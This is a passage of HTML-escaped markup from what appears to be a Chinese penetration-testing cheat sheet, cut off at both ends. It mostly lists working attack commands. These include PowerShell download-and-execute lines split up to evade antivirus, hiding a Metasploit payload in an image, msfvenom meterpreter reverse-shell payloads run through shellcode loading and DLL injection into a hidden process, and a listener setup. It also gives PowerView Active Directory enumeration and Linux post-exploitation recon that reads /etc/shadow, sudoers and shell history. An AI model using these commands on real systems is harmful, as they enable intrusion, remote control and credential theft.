data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;也可以对http字符进行绕过，同样可以bypass&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell \&quot;$a=&#39;IEX((new-object net.webclient).downloadstring(\&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1\&quot;))&#39;;IEX ($a+$b)\&quot;  &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;图片免杀&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/peewpw/Invoke-PSImage&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1900*1200的图片x.jpg。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;C:\\powershell &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS C:\\ Import-Module .\\Invoke-PSImage.ps1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS C:\\ Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse_shell.png -Web &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;加载shellcode&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom生成脚本木马&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;在windows靶机上运行一下命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1\&quot;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://192.168.72.164/test\&quot;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-Shellcode -Shellcode $buf -Force  运行木马 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用Invoke-Shellcode.ps1脚本执行shellcode&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;即可反弹meterpreter shell&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;加载dll&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用msfvenom 生成dll木马脚本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将生成的dll上传到目标的C盘。在靶机上执行以下命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1\&quot;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Start-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;创建新的进程启动记事本，并设置为隐藏&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID  &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Msf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use exploit/multi/handler&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;run&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;powerview\&quot;&gt;Powerview&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#powerview\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取当前域信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; Get-NetDomain}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/302.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; get-netforest}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/303.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举管理员&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; Invoke-EnumerateLocalAdmin}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/304.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查询管理在线的机器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; invoke-userhunter}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/305.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看域内机器以administrator权限运行的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; invoke-processhunter }\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/306.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;或指定参数userfile和computerfile查询某台机器某个用户的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; invoke-processhunter -Userfile .\\user.txt -computerfile .\\host.txt}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/307.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查询域内机器共享&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;powershell -exec bypass -Command \&quot;&amp;#x26;{Import-Module .\\powerview.ps1; Invoke-sharefinder}\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/308.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查询域内机器&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetComputer -Domain zone.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/309.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/310.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Dev-powerview&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域控机器和win版本&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-DomainController |select name,osversion|fl &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举其他域： Get-NetDomain -Domain &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域 SID： Get-DomainSID&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域策略：Get-DomainPolicy&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;获取域控制器：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainController&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainController -Domain &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域用户：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetUser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetUser -SamAccountName &amp;#x3C;user &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetUser | select cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;检查上次修改密码&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-UserProperty -Properties pwdlastset&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetComputer -FullData&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-DomainGroup&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举存活主机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetComputer -Ping&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举组策略：Get-NetGPO&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;显示某台机器的活动策略&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetGPO -ComputerName &amp;#x3C;Name of the PC&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举 OU：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetOU -FullData &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetGPO -GPOname &amp;#x3C;The GUID of the GPO&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;枚举域信任：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainTrust&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Get-NetDomainTrust -Domain &amp;#x3C;DomainName&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查找当前域中当前用户具有本地管理员访问权限的所有计算机&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Find-LocalAdminAccess -Verbose&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;在域的所有机器上查找本地管理员&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Invoke-EnumerateLocalAdmin -Verbose&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;全部使用技巧&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;操作系统&amp;#x26;内核版本&amp;#x26;环境变量&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/issue&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/lsb-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/redhat-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /proc/version&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -mrs&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;rpm -q kernel&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dmesg | grep Linux&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls /boot | grep vmlinuz-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/profile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/bashrc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bash_profile&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bashrc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bash_logout&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;env&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Root权限进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ps aux | grep root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ps -ef | grep root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;计划任务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;crontab -l&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -alh /var/spool/cron&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /etc/ | grep cron&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/at.allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/at.deny&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/cron.allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/cron.deny&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/anacrontab&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /var/spool/cron/crontabs/root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;IP信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/sbin/ifconfig -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/network/interfaces&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/sysconfig/network&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;连接信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;grep 80 /etc/services&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antpx&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -tulpn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chkconfig --list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chkconfig --list | grep 3:on&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;last&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;w&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;用户信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;id&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whomi&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;w&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;last&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/passwd&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/group&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/shadow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -alh /var/mail/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;grep -v -E \&quot;^#\&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # 列出超级用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;awk -F: &#39;($3 == \&quot;0\&quot;) {print}&#39; /etc/passwd   #列出超级用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/sudoers&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo –l&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;操作记录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.bash_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.nano_history&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat ~/.atftp_history&lt;/span&gt;&lt;/span&gt;\n&lt;span 